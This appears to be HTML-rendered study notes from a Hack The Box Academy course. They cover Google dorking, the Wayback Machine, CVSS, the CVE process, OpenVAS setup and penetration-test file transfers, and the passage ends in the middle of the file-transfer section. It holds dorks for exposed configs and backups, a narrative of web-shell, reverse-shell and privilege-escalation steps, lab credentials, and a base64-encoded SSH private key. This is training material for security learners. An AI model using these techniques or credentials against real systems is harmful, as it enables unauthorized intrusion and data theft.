    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AND&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Narrows results by requiring all terms to be present.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com AND (inurl:admin OR inurl:login)&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find admin or login pages specifically on example.com.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OR&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Broadens results by including pages with any of the terms.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;linux&quot; OR &quot;ubuntu&quot; OR &quot;debian&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for webpages mentioning Linux, Ubuntu, or Debian.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NOT&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Excludes results containing the specified term.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:bank.com NOT inurl:login&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find pages on bank.com excluding login pages.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; (wildcard)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Represents any character or word.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:socialnetwork.com filetype:pdf user* manual&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; (range search)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Finds results within a specified numerical range.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:ecommerce.com &quot;price&quot; 100..500&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Look for products priced between 100 and 500 on an e-commerce website.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot; &quot;&lt;/code&gt; (quotation marks)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Searches for exact phrases.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;information security policy&quot;&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Find documents mentioning the exact phrase “information security policy”.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt; (minus sign)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Excludes terms from the search results.&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:news.com -inurl:sports&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Search for news articles on news.com excluding sports-related content.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;google-dorking&quot;&gt;Google Dorking&lt;/h3&gt;

&lt;p&gt;Google Dorking, also known as Google Hacking, is a technique that leverages the power of search operators to uncover sensitive information, security vulnerabilities, or hidden content on websites, using Google Search.&lt;/p&gt;

&lt;p&gt;Here are some common examples of Google Dorks, for more examples, refer to the &lt;a href=&quot;https://www.exploit-db.com/google-hacking-database&quot;&gt;Google Hacking Database&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Finding Login Pages:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com inurl:login&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com (inurl:login OR inurl:admin)&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Identifying Exposed Files:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com filetype:pdf&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com (filetype:xls OR filetype:docx)&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Uncovering Configuration Files:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com inurl:config.php&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com (ext:conf OR ext:cnf)&lt;/code&gt; (searches for extensions commonly used for configuration files)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Locating Database Backups:
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com inurl:backup&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;site:example.com filetype:sql&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;web-archives&quot;&gt;Web Archives&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;In the fast-paced digital world, websites come and go, leaving only fleeting traces of their existence behind. However, thanks to the &lt;a href=&quot;https://web.archive.org/&quot;&gt;Internet Archive’s Wayback Machine&lt;/a&gt;, we have a unique opportunity to revisit the past and explore the digital footprints of websites as they once were.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The Wayback Machine&lt;/code&gt; is a digital archive of the World Wide Web and other information on the Internet. Founded by the Internet Archive, a non-profit organization, it has been archiving websites since 1996.&lt;/p&gt;

&lt;h2 id=&quot;going-wayback-on-htb&quot;&gt;Going Wayback on HTB&lt;/h2&gt;

&lt;p&gt;We can view the first archived version of HackTheBox by entering the page we are looking for into the Wayback Machine and selecting the earliest available capture date, being &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2017-06-10 @ 04h23:01&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;https://web.archive.org/&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;common-vulnerability-scoring-system-cvss&quot;&gt;Common Vulnerability Scoring System (CVSS)&lt;/h1&gt;

&lt;p&gt;There are various ways to score or calculate severity ratings of vulnerabilities. The &lt;a href=&quot;https://www.first.org/cvss/&quot;&gt;Common Vulnerability Scoring System (CVSS)&lt;/a&gt; is an industry standard for performing these calculations. Many scanning tools will apply these scores to each finding as a part of the scan results, but it’s important that we understand how these scores are derived in case we ever need to calculate one by hand or justify the score applied to a given vulnerability. The CVSS is often used together with the so-called &lt;a href=&quot;https://en.wikipedia.org/wiki/DREAD_\(risk_assessment_model\)&quot;&gt;Microsoft DREAD&lt;/a&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DREAD&lt;/code&gt; is a risk assessment system developed by Microsoft to help IT security professionals evaluate the severity of security threats and vulnerabilities. It is used to perform a risk analysis by using a scale of 10 points to assess the severity of security threats and vulnerabilities. With this, we calculate the risk of a threat or vulnerability based on five main factors:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Damage Potential&lt;/li&gt;
  &lt;li&gt;Reproducibility&lt;/li&gt;
  &lt;li&gt;Exploitability&lt;/li&gt;
  &lt;li&gt;Affected Users&lt;/li&gt;
  &lt;li&gt;Discoverability&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The model is essential to Microsoft’s security strategy and is used to monitor, assess and respond to security threats and vulnerabilities in Microsoft products. It also serves as a reference for IT security professionals and managers to perform their risk assessment and prioritization of security threats and vulnerabilities.&lt;/p&gt;

&lt;h2 id=&quot;calculating-cvss-severity&quot;&gt;Calculating CVSS Severity&lt;/h2&gt;

&lt;p&gt;The calculation of a CVSS v3.1 score takes into account all the metrics discussed in this section. The National Vulnerability Database has a calculator available to the public &lt;a href=&quot;https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;common-vulnerabilities-and-exposures-cve&quot;&gt;Common Vulnerabilities and Exposures (CVE)&lt;/h1&gt;

&lt;h2 id=&quot;open-vulnerability-assessment-language-oval&quot;&gt;Open Vulnerability Assessment Language (OVAL)&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://oval.mitre.org/&quot;&gt;Open Vulnerability Assessment Language (OVAL)&lt;/a&gt; is a publicly available information security international standard used to evaluate and detail the system’s current state and issues. OVAL is also co-supported by the office of Cybersecurity and Communications from the U.S. Department of Homeland Security. OVAL provides a language to understand encoding system attributes and various content repositories shared within the security community. The OVAL repository has over 7000+ definitions for public use. Additionally, OVAL is also used by the U.S. National Institute of Standards and Technology’s (NIST) Security Content Automation Protocol (SCAP) which brings together community ideas for automating vulnerability management, measurement, and ensuring systems meet policy compliance.&lt;/p&gt;

&lt;h1 id=&quot;cve&quot;&gt;CVE&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/&quot;&gt;Common Vulnerabilities and Exposures (CVE)&lt;/a&gt; is a publicly available catalog of security issues sponsored by the United States Department of Homeland Security (DHS). Each security issue has a unique CVE ID number assigned by the CVE Numbering Authority (CNA). The purpose of creating a unique CVE ID number is to create a standardization for a vulnerability or exposure as a researcher identifies it. A CVE consists of critical information regarding a vulnerability or exposure, including a description and references about the issue. The information in a CVE allows an organization’s IT team to understand how detrimental a problem could be to their environment.&lt;/p&gt;

&lt;p&gt;The following chart explains how a CVE ID may be assigned to a vulnerability. Any vulnerabilities assigned a CVE must be independently fixable, affect just one codebase, and be acknowledged and documented by the relevant vendor.&lt;/p&gt;

&lt;h4 id=&quot;stage-1-identify-if-cve-is-required-and-relevant&quot;&gt;Stage 1: Identify if CVE is Required and Relevant&lt;/h4&gt;

&lt;p&gt;Identify if the issue found is a vulnerability. According to the CVE Team, “A vulnerability in the context of the CVE Program is indicated by code that can be exploited, resulting in a negative impact to confidentiality, integrity, OR availability, and that requires a coding change, specification change, or specification deprecation to mitigate or address.” Additionally, research should verify there is not a CVE ID already in the CVE database.&lt;/p&gt;

&lt;h4 id=&quot;stage-2-reach-out-to-affected-product-vendor&quot;&gt;Stage 2: Reach Out to Affected Product Vendor&lt;/h4&gt;

&lt;p&gt;A researcher should ensure they have made a good faith effort to contact a vendor directly. Researchers can reference CVE’s &lt;a href=&quot;https://cve.mitre.org/cve/researcher_reservation_guidelines#appendix#a&quot;&gt;Documents on Disclosure Practices&lt;/a&gt; for additional information.&lt;/p&gt;

&lt;h4 id=&quot;stage-3-identify-if-request-should-be-for-vendor-cna-or-third-party-cna&quot;&gt;Stage 3: Identify if Request Should Be For Vendor CNA or Third Party CNA&lt;/h4&gt;

&lt;p&gt;If a company is a part of participating CNA’s, they can assign a CVE ID for one of their products. If the issue is for a participating CNA, researchers can contact the appropriate CNA organization &lt;a href=&quot;https://cve.mitre.org/cve/request_id.html&quot;&gt;here&lt;/a&gt;. If the vendor is not a participating CNA, a researcher should attempt to reach out to the vendor’s third-party coordinator.&lt;/p&gt;

&lt;h4 id=&quot;stage-4-requesting-cve-id-through-cve-web-form&quot;&gt;Stage 4: Requesting CVE ID Through CVE Web Form&lt;/h4&gt;

&lt;p&gt;The CVE Team has a form that can be filled out online &lt;a href=&quot;https://cveform.mitre.org/&quot;&gt;here&lt;/a&gt; if the methods above do not work for CVE requests.&lt;/p&gt;

&lt;h4 id=&quot;stage-5-confirmation-of-cve-form&quot;&gt;Stage 5: Confirmation of CVE Form&lt;/h4&gt;

&lt;p&gt;Upon submitting the CVE Web Form mentioned in Stage 4, an individual will receive a confirmation email. The CVE team will contact the requestor if any additional information is required.&lt;/p&gt;

&lt;h4 id=&quot;stage-6-receival-of-cve-id&quot;&gt;Stage 6: Receival of CVE ID&lt;/h4&gt;

&lt;p&gt;Upon approval, the CVE Team will notify the requestor of a CVE ID if the affected product’s vulnerability is confirmed. Please note that the CVE ID is not public yet at this stage.&lt;/p&gt;

&lt;h4 id=&quot;stage-7-public-disclosure-of-cve-id&quot;&gt;Stage 7: Public Disclosure of CVE ID&lt;/h4&gt;

&lt;p&gt;CVE IDs can be announced to the public as soon as appropriate vendors and parties are aware of the issue to prevent duplication of CVE IDs. This stage ensures that all associated parties are aware of the problem before being publicly disclosed.&lt;/p&gt;

&lt;h4 id=&quot;stage-8-announcing-the-cve&quot;&gt;Stage 8: Announcing the CVE&lt;/h4&gt;

&lt;p&gt;The CVE Team asks researchers who are sharing multiple CVEs to ensure each CVE indicates the different vulnerabilities. Additional information can be found &lt;a href=&quot;https://cve.mitre.org/cve/researcher_reservation_guidelines&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;stage-9-providing-information-to-the-cve-team&quot;&gt;Stage 9: Providing Information to The CVE Team&lt;/h4&gt;

&lt;p&gt;At this stage, the CVE Team asks that the researcher help provide additional information to be used in the official CVE listing on the website. The &lt;a href=&quot;https://nvd.nist.gov/&quot;&gt;U.S. National Vulnerability Database (NVD)&lt;/a&gt; maintains this information online in their database as well.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;getting-started-with-openvas&quot;&gt;Getting Started with OpenVAS&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://openvas.org/&quot;&gt;OpenVAS&lt;/a&gt;, by Greenbone Networks, is a publicly available vulnerability scanner. Greenbone Networks has an entire Vulnerability Manager, part of which is the OpenVAS scanner. Greenbone’s Vulnerability Manager is also open to the public and free to use. OpenVAS has the capabilities to perform network scans, including authenticated and unauthenticated testing.![[opena_vas.png]]&lt;/p&gt;

&lt;h2 id=&quot;installing-package&quot;&gt;Installing Package&lt;/h2&gt;

&lt;p&gt;First, we can start by installing the tool:&lt;/p&gt;

&lt;p&gt;Getting Started with OpenVAS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; full-upgrade
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;gvm &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; openvas

c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gvm-setup
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gvm-start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The VM provided in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenVAS Skills Assessment&lt;/code&gt; section has OpenVAS pre-installed and the targets running. You can go to that section and start the VM and use OpenVAS throughout the module, which can be accessed at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://&amp;lt; IP &amp;gt;:8080&lt;/code&gt;. The OpenVAS credentials are: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;htb-student&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTB_@cademy_student!&lt;/code&gt;. You may also use these credentials to SSH into the target VM to configure OpenVAS.&lt;/p&gt;

&lt;p&gt;The OpenVAS Greenbone Security Assistant application has various tabs that you can interact with. For this section, we will be digging into the scans. If you navigate to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Scans&lt;/code&gt; tab shown below, you will see the scans that have run in the past. You will also be able to see how to create a new task to run a scan. The tasks work off of the scanning configurations that the user sets up.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The scans shown in this section have already been pre-run to save you the time of waiting for them to finish. If you re-run the scan, it’s best to go through vulnerabilities as they come, instead of waiting for the scan to finish, as they can take 1-2 hours to finish.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; To run a credentialed scan on the target, use the following credentials: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;htb-student_adm&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTB_@cademy_student!&lt;/code&gt; for Linux 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Academy_VA_adm1!&lt;/code&gt; for Windows. 
These scans have already been set up in the OpenVAS target to save you time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; For this module, the Windows target will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.16.100&lt;/code&gt; and the Linux target will be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.16.16.160&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;file-transfers&quot;&gt;File Transfers&lt;/h1&gt;
&lt;p&gt;#file-transfer #scp&lt;/p&gt;

&lt;p&gt;There are many situations when transferring files to or from a target system is necessary. Let’s imagine the following scenario:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Setting the Stage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;PowerUp.ps1&lt;/a&gt; (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control&quot;&gt;Application Control Policy&lt;/a&gt;. We perform our local enumeration manually and find that we have &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege&quot;&gt;SeImpersonatePrivilege&lt;/a&gt;. We need to transfer a binary to our target machine to escalate privileges using the &lt;a href=&quot;https://github.com/itm4n/PrintSpoofer&quot;&gt;PrintSpoofer&lt;/a&gt; tool. We then try to use &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil&quot;&gt;Certutil&lt;/a&gt; to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py&quot;&gt;Impacket smbserver&lt;/a&gt; tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;windows-file-transfer-methods&quot;&gt;Windows File Transfer Methods&lt;/h1&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;The Windows operating system h—as evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let’s use the &lt;a href=&quot;https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/&quot;&gt;Microsoft Astaroth Attack&lt;/a&gt; blog post as an example of an advanced persistent threat (APT).&lt;/p&gt;

&lt;p&gt;The blog post starts out talking about &lt;a href=&quot;https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/&quot;&gt;fileless threats&lt;/a&gt;. The term &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fileless&lt;/code&gt; suggests that a threat doesn’t come in a file, they use legitimate tools built into a system to execute an attack. This doesn’t mean that there’s not a file transfer operation. As discussed later in this section, the file is not “present” on the system but runs in memory.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Astaroth attack&lt;/code&gt; generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic&quot;&gt;WMIC tool&lt;/a&gt; with the “/Format” parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool&quot;&gt;Bitsadmin tool&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32&quot;&gt;regsvr32&lt;/a&gt; tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Userinit&lt;/code&gt; process. Below is a graphical depiction of the attack.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png&quot; alt=&quot;Flowchart of a spear-phishing attack using WMIC, Bitsadmin, Certutil, and Regsvr32 to execute and inject malicious DLLs.&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png&quot;&gt;Image source&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is an excellent example of multiple methods for file transfer and the threat actor using those methods to bypass defenses.&lt;/p&gt;

&lt;p&gt;This section will discuss using some native Windows tools for download and upload operations. Later in the module, we’ll discuss &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Living Off The Land&lt;/code&gt; binaries on Windows &amp;amp; Linux and how to use them to perform file transfer operations.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;id_rsa
&lt;span class=&quot;go&quot;&gt;
4e301756a07ded0a2dd6953abf015278  id_rsa
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;pwnbox-encode-ssh-key-to-base64&quot;&gt;Pwnbox Encode SSH Key to Base64&lt;/h4&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;id_rsa |base64 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.&lt;/p&gt;

&lt;p&gt;Windows File Transfer Methods&lt;/p&gt;

